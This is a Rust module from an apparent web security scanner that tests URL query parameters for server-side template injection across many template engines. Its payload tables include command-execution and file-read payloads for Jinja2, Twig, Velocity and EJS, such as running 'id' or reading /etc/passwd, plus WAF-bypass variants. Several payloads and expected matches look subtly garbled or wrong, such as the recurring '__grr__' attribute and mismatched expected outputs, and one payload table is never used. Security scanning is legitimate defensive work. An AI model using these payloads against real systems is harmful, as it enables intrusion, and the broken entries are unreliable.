//! Server-Side Template Injection (SSTI) detection — multi-engine, multi-stage.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

/// SSTI payloads organized by template engine with RCE-stage escalation.
const SSTI_PAYLOADS: &[(&str, &str, &str)] = &[
    // Jinja2 (Python) — basic detection
    ("Jinja2", "{{7*7}}", r"49"),
    ("Jinja2", "{{7*'7'}}", r"7777777"),
    ("Jinja2", "{{config}}", r"(?i)<.*Config.*>"),
    ("Jinja2", "{{self}}", r"(?i)<.*TemplateReference.*>"),
    ("Jinja2", "{{''.__class__.__mro__}}", r"(?i)object"),
    ("Jinja2", "{{request.application.__grr__}}", r"(?i)app"),
    ("Jinja2", "{{get_flashed_messages.__grr__}}", r"(?i)grr"),
    // Jinja2 RCE escalation
    (
        "Jinja2",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        r"(?i)subprocess",
    ),
    (
        "Jinja2",
        "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if x.__name__=='catch_warnings' %}{{ x()._module.__grr__ }}{% endif %}{% endfor %}",
        r"(?i)grr",
    ),
    (
        "Jinja2",
        "{{ self.__dict__.__class__.__mro__[1].__subclasses__() }}",
        r"(?i)catch_warnings",
    ),
    (
        "Jinja2",
        "{% for c in [].__class__.__bases__[0].__subclasses__() %}{% if c.__name__=='Popen' %}{{ c('/bin/cat /etc/passwd',shell=True,stdout=-1).communicate() }}{% endif %}{% endfor %}",
        r"root:",
    ),
    // Jinja2 URL-based OOB
    (
        "Jinja2",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        r"(?i)catch_warnings",
    ),
    ("Jinja2", "{{url_for.__grr__}}", r"(?i)grr"),
    ("Jinja2", "{{url_for.__grr__.__init__.__grr__}}", r"(?i)grr"),
    // Twig (PHP) — basic detection
    ("Twig", "{{7*7}}", r"49"),
    ("Twig", "{{7*'7'}}", r"7777777"),
    ("Twig", "{{app}}", r"(?i)Twig"),
    ("Twig", "{{dump()}}", r"(?i)VAR DUMP"),
    ("Twig", "{{'foo'..'bar'}}", r"foo"),
    ("Twig", "{{_self.getiterator()}}", r"(?i)Twig"),
    // Twig RCE escalation
    (
        "Twig",
        "{{_self.getiterator(['system','id'])}}",
        r"(?i)uid=",
    ),
    ("Twig", "{{include('/etc/passwd')}}", r"root:"),
    ("Twig", "{{file_get_contents('/etc/passwd')}}", r"root:"),
    // Smarty (PHP)
    ("Smarty", "{$smarty.version}", r"\d+\.\d+"),
    ("Smarty", "{$7*7}", r"49"),
    ("Smarty", "{$smarty.server.PHP_SELF}", r"(?i)cgi-bin"),
    // Freemarker (Java)
    ("Freemarker", "${7*7}", r"49"),
    ("Freemarker", "${7*'7'}", r"7777777"),
    ("Freemarker", "${.version}", r"(?i)Freemarker"),
    (
        "Freemarker",
        "${freemarker.runtime_version}",
        r"(?i)Freemarker",
    ),
    ("Freemarker", "${.main}", r"(?i)main"),
    ("Freemarker", "${.template}?has_content", r"(?i)yes"),
    ("Freemarker", "${.freemarker_version}", r"(?i)Freemarker"),
    // Velocity (Java)
    ("Velocity", "#set($x=7*7)$x", r"49"),
    (
        "Velocity",
        "#set($x=$runtime.class.name)$x",
        r"(?i)Velocity",
    ),
    (
        "Velocity",
        "#set($ctx=$class.forName('java.lang.Runtime').getRuntime().exec('id'))",
        r"(?i)uid=",
    ),
    (
        "Velocity",
        "#set($str=$class.forName('java.lang.String').valueOf(7*7))$str",
        r"49",
    ),
    // Mako (Python)
    ("Mako", "${7*7}", r"49"),
    (
        "Mako",
        "${config.__class__.__init__.__globals__}",
        r"(?i)mako",
    ),
    ("Mako", "${self.module.__class__.__mro__}", r"object"),
    // Jade/Pug (Node.js)
    ("Jade/Pug", "= 7*7", r"49"),
    ("Jade/Pug", "#{7*7}", r"49"),
    // EJS (Node.js)
    ("EJS", "<%= 7*7 %>", r"49"),
    (
        "EJS",
        "<%= process.mainModule.require('child_process').execSync('id') %>",
        r"(?i)uid=",
    ),
    ("EJS", "<%- 7*7 %>", r"49"),
    // Handlebars (Node.js)
    ("Handlebars", "{{7*7}}", r"49"),
    (
        "Handlebars",
        "{{#with this as |foo|}}{{foo.7*7}}{{/with}}",
        r"49",
    ),
    // Nunjucks (Node.js)
    ("Nunjucks", "{{7*7}}", r"49"),
    ("Nunjucks", "{{7*'7'}}", r"7777777"),
    // Mustache
    ("Mustache", "{{7*7}}", r"\{\{7\*7\}\}"),
    // Liquid (Ruby)
    ("Liquid", "{{7*7}}", r"49"),
    ("Liquid", "{{site.password}}", r"(?i)liquid"),
    // Generic (must try all engines)
    ("Generic", "${7*7}", r"49"),
    ("Generic", "${{7*7}}", r"49"),
    ("Generic", "#{7*7}", r"49"),
    ("Generic", "${'7'*7}", r"7777777"),
    ("Generic", "${7+\"7\"}", r"14"),
    ("Generic", "#{7*7}", r"49"),
    ("Generic", "{{7*7}}", r"49"),
    // Encoding-based bypasses
    (
        "Jinja2",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        r"(?i)uid=",
    ),
    (
        "Twig",
        "{{_self.getiterator(['system','whoami'])}}",
        r"(?i)uid=",
    ),
];

/// URL-safe encoding variants for SSTI bypass.
const SSTI_ENCODED_VARIANTS: &[(&str, &str, &str)] = &[
    ("Jinja2", "{{7*7}}", r"49"),
    ("Jinja2", "{{ 7*7 }}", r"49"),
    ("Jinja2", "{{=7*7}}", r"49"),
    ("Jinja2", "{{ (!7*7)-!7*7 }}", r"49"),
    ("Jinja2", "{{''.center(49)}}", r"49"),
    ("Twig", "{{7*7}}", r"49"),
    ("Twig", "{{ 7*7 }}", r"49"),
    ("Freemarker", "${7*7}", r"49"),
    ("Freemarker", "${(7*7)}", r"49"),
    ("Freemarker", "${(7+\"7\")}", r"49"),
    ("Velocity", "#set($x=7*7)$x", r"49"),
];

/// WAF bypass variants for SSTI payloads.
const SSTI_WAF_BYPASS: &[(&str, &str, &str)] = &[
    ("Jinja2", "{{/*7*/7}}", r"49"),
    ("Jinja2", "{{/**/7/**/*7/**/}}", r"49"),
    ("Jinja2", "{{7/**/7}}", r"49"),
    ("Jinja2", "{% raw %}{{7*7}}{% endraw %}", r"49"),
    ("Jinja2", "{{ config['class'].__init__.__globals__ }}", r""),
    ("Twig", "{{/**/7/**/7}}", r"49"),
    ("Twig", "{{ 7 /* comment */ * 7 }}", r"49"),
    ("Freemarker", "${/**/7/**/*7}", r"49"),
    ("Velocity", "#set/* comment */($x=7*7)$x", r"49"),
];

/// Extract template engine hints from response headers and body.
pub fn detect_template_engine(body: &str, headers: &[(String, String)]) -> Option<String> {
    let indicators = [
        (r"(?i)freemarker", "Freemarker"),
        (r"(?i)twig", "Twig"),
        (r"(?i)jinja", "Jinja2"),
        (r"(?i)velocity", "Velocity"),
        (r"(?i)mako", "Mako"),
        (r"(?i)liquid", "Liquid"),
        (r"(?i)ejs", "EJS"),
        (r"(?i)nunjucks", "Nunjucks"),
        (r"(?i)handlebars", "Handlebars"),
        (r"X-Powered-By:.*Twig", "Twig"),
        (r"X-Powered-By:.*Jinja", "Jinja2"),
        (r"X-AspNet-Version", "ASP.NET"),
        (r"X-Laravel", "Laravel"),
        (r"X-Earlgrey", "Earlgrey/Laravel"),
        (r"Set-Cookie:.*laravel_session", "Laravel"),
        (r"Set-Cookie:.*twig", "Twig"),
    ];

    let combined = format!(
        "{}\n{}",
        headers
            .iter()
            .map(|(k, v)| format!("{}: {}", k, v))
            .collect::<Vec<_>>()
            .join("\n"),
        body
    );

    for (pattern, engine) in &indicators {
        if let Ok(re) = Regex::new(pattern)
            && re.is_match(&combined)
        {
            return Some(engine.to_string());
        }
    }
    None
}

pub async fn check_ssti(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect::<Vec<_>>();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _original_value) in &base_query {
        // Try all engine-specific payloads regardless of detected engine,
        // since many payloads work across multiple template engines.
        for (engine_label, payload, expected_pattern) in SSTI_PAYLOADS {
            let mut test_url = url.clone();
            {
                let mut pairs = test_url.query_pairs_mut();
                pairs.clear();
                for (k, v) in &base_query {
                    let val = if k == param_name {
                        payload.to_string()
                    } else {
                        v.clone()
                    };
                    pairs.append_pair(k, &val);
                }
            }

            if let Ok(response) = client
                .get(
                    "grym-web-scanner",
                    test_url,
                    TechniqueTier::StandardDetection,
                )
                .await
                && let Ok(re) = Regex::new(expected_pattern)
                && re.is_match(&response.body)
            {
                let mut f = Finding::new(
                    format!(
                        "SSTI detected in parameter '{}' ({} engine)",
                        param_name, engine_label
                    ),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::Critical,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                );
                f.categories.push("A05:2025-Injection".into());
                f.cwe_ids.push(1336);
                f.evidence.push(Evidence::redacted(
                    "ssti-reflection",
                    format!(
                        "Engine: {}, Payload: {}, Match: {}",
                        engine_label, payload, expected_pattern
                    ),
                    response.body.chars().take(200).collect::<String>(),
                ));
                f.remediation = "Do not render user input in templates. Use sandboxed template engines with strict whitelists and auto-escaping.".into();
                f.references
                    .push("https://owasp.org/www-project-web-security-testing-guide/".into());
                findings.push(f);
                break;
            }
        }

        // If no engine detected, try WAF bypass variants
        if findings.iter().all(|f| !f.title.contains(param_name)) {
            for (_engine_label, payload, expected_pattern) in SSTI_WAF_BYPASS {
                let mut test_url = url.clone();
                {
                    let mut pairs = test_url.query_pairs_mut();
                    pairs.clear();
                    for (k, v) in &base_query {
                        let val = if k == param_name {
                            payload.to_string()
                        } else {
                            v.clone()
                        };
                        pairs.append_pair(k, &val);
                    }
                }

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                    && let Ok(re) = Regex::new(expected_pattern)
                    && re.is_match(&response.body)
                {
                    let mut f = Finding::new(
                        format!("WAF-bypassed SSTI detected in parameter '{}'", param_name),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Critical,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("A05:2025-Injection".into());
                    f.cwe_ids.push(1336);
                    f.evidence.push(Evidence::redacted(
                        "ssti-waf-bypass",
                        format!("WAF bypass payload: {}", payload),
                        response.body.chars().take(200).collect::<String>(),
                    ));
                    f.remediation = "Deploy a WAF with SSTI-specific protection and use sandboxed template engines.".into();
                    f.references.push(
                        "https://docs.palletsprojects.com/en/latest/jinja2/templates/#security"
                            .into(),
                    );
                    findings.push(f);
                    break;
                }
            }
        }
    }

    Ok(findings)
}
